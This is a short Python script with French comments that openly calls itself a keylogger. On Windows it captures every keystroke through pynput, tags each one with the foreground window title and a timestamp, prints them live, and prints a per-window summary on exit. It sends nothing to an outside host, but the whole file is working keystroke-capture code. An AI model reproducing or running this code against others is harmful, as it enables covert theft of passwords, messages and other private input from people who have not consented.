from pynput import keyboard
import win32gui
from datetime import datetime
# import pyperclip

current_window = ""
log_data = {}

# Fonction appelée à l'arrêt (Ctrl+C) pour afficher le résumé
def afficher_resume():
    print("\n\n===== Résumé des frappes par fenêtre =====\n")
    for window, (start_time, chars) in log_data.items():
        print(f"Fenêtre : {window}")
        print(f"Ouvert à : {start_time}")
        print("Contenu :")
        print(''.join(chars))
        print("\n" + "-"*50 + "\n")

def get_active_window_title():
    window = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(window)

def on_press(key):
    global current_window, log_data

    new_window = get_active_window_title()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if new_window != current_window:
        current_window = new_window
        print(f"\n[+] {now} | Nouvelle fenêtre active : {current_window}")
        if current_window not in log_data:
            # Initialise : [horodatage_ouverture, liste_de_frappe]
            log_data[current_window] = [now, []]

    try:
        char = key.char
    except AttributeError:
        char = f"[{key.name}]"

    log_data[current_window][1].append(char)  # ajoute la frappe

    # Affiche la frappe en direct
    print(f"{now} | {current_window} > {char}")



# Lancer le keylogger
try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    afficher_resume()
